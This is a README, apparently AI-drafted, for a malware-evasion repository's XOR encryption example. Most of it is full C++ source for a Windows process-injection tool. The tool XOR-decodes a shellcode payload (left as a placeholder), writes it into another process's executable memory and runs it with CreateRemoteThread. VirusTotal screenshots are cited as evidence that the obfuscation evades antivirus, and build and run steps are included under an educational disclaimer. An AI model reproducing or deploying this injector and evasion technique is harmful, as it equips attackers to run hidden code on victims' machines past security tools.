Here’s an updated README for the `XOR_encryption` directory, incorporating details about the XOR encryption implementation and the provided code:

---

# XOR Encryption

## Overview

The `XOR_encryption` directory provides a practical example of XOR encryption used to obfuscate payloads, which can be helpful in understanding basic malware evasion techniques. This example demonstrates how to use XOR encryption to hide the contents of a shellcode and how to inject it into a target process.

## Files Included

- **`XOR_encryption.vcxproj`**: Visual Studio project file for building the XOR encryption example.
- **`XOR_encryption.vcxproj.filters`**: Visual Studio filters file for the XOR encryption project.
- **`XorMalwareEnc.cpp`**: Source code implementing XOR encryption and shellcode injection.
- **`.gitattributes`**: Git attributes file for defining repository settings.
- **`.gitignore`**: Git ignore file to specify files and directories to be ignored by Git.
- **`README.md`**: This README file.

## Implementation

### `XorMalwareEnc.cpp`

This file contains the implementation for XOR encryption and the injection of obfuscated shellcode into a target process. Here’s a breakdown of the functionality:

- **XOR Encryption**: The payload is encrypted using XOR encryption with a key. The encryption function XORs each byte of the payload with a key value modified by its position.
- **Shellcode Injection**: The decrypted shellcode is injected into the target process's memory and executed using a remote thread.

#### Key Components

- **`xorEncryptDecrypt` Function**: This function performs XOR encryption and decryption. It takes a pointer to the shellcode, its size, and a key. The function XORs each byte of the shellcode with the key (modified by the byte’s index).

- **`decryptShellcode` Function**: This function calls `xorEncryptDecrypt` to decrypt the shellcode and writes it to the target process’s memory.

- **`main` Function**: This is the entry point of the application. It opens a handle to the target process, allocates memory in the process for the shellcode, writes the decrypted shellcode into the allocated memory, and creates a remote thread to execute the shellcode.

### Sample Code

Here’s a snippet from `XorMalwareEnc.cpp` demonstrating XOR encryption and shellcode injection:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)

unsigned char R0m4InShell[] = /* XOR encrypted payload */;
#define XOR_KEY 0xAA

// Function to decrypt the shellcode
unsigned char* xorEncryptDecrypt(const unsigned char* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
    unsigned char* decryptedShellcode = (unsigned char*)malloc(sShellcodeSize);
    if (decryptedShellcode == NULL) {
        perror("Failed to allocate memory for decrypted shellcode");
        exit(EXIT_FAILURE);
    }

    for (size_t i = 0; i < sShellcodeSize; i++) {
        decryptedShellcode[i] = pShellcode[i] ^ (bKey + i);
        printf("\\x%02x", decryptedShellcode[i]);
    }
    return decryptedShellcode;
}

void decryptShellcode() {
    unsigned char* decryptedShellcode = xorEncryptDecrypt(R0m4InShell, sizeof(R0m4InShell), XOR_KEY);
    free(decryptedShellcode); // Clean up memory when done
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warning("You should enter the process ID to inject the SHELLCODE in! \n USAGE: R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess != NULL) {
        okay("Got handle on the process: 0x%p", hProcess);

        // Allocate memory in the target process
        LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions in process %ld", sizeof(R0m4InShell), PID);

        // Decrypt the shellcode
        unsigned char* decryptedShellcode = xorEncryptDecrypt(R0m4InShell, sizeof(R0m4InShell), XOR_KEY);

        // Write the decrypted shellcode into the target process
        WriteProcessMemory(hProcess, rBuffer, decryptedShellcode, sizeof(R0m4InShell), NULL);
        info("Wrote %zu bytes to process memory\n", sizeof(R0m4InShell));

        // Clean up
        free(decryptedShellcode);

        // Create a remote thread to execute the shellcode
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
        if (hThread != NULL) {
            info("Created remote thread in process %ld", PID);
        } else {
            warning("Failed to create remote thread: %ld", GetLastError());
        }

        // Close handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    } else {
        warning("Failed to open process: %ld", GetLastError());
    }

    return EXIT_SUCCESS;
}
```

### VirusTotal Analysis

To showcase the effectiveness of XOR encryption, screenshots from VirusTotal are included. These screenshots demonstrate the difference in detection rates before and after applying XOR encryption.

![VirusTotal Before Encryption](path/to/your/screenshot1.png)
*VirusTotal result before XOR encryption*
![Uploading Screenshot 2024-08-31 141758.png…]()

![VirusTotal After Encryption](path/to/your/screenshot2.png)
*VirusTotal result after XOR encryption*
![Screenshot 2024-08-31 144206](https://github.com/user-attachments/assets/83b5b365-6ab1-4f65-b610-2dd74a911f65)

## Building the Project

To build the XOR encryption example:

1. **Open the Solution**:
   - Open `MalwareEvasionTechniques.sln` in Visual Studio.

2. **Build the Project**:
   - Build the solution using the appropriate configuration (Debug/Release).

3. **Run the Executable**:
   - Execute the compiled binary and provide the process ID (PID) as a command-line argument to inject the shellcode.

## Usage

Compile and run the `XorMalwareEnc.cpp` file with the target process ID to test the XOR encryption and shellcode injection:

```bash
XorMalwareEnc.exe <PID>
```

## Contributing

Contributions to this repository are welcome! If you have improvements or additional examples of XOR encryption or other evasion techniques, please submit a pull request. Ensure that your contributions adhere to ethical guidelines and are intended for educational and research purposes only.

## Disclaimer

This repository is for educational and research purposes only. The techniques demonstrated here are intended to help security professionals understand and defend against malware evasion tactics. Misuse of the information contained in this repository is not condoned by the author.
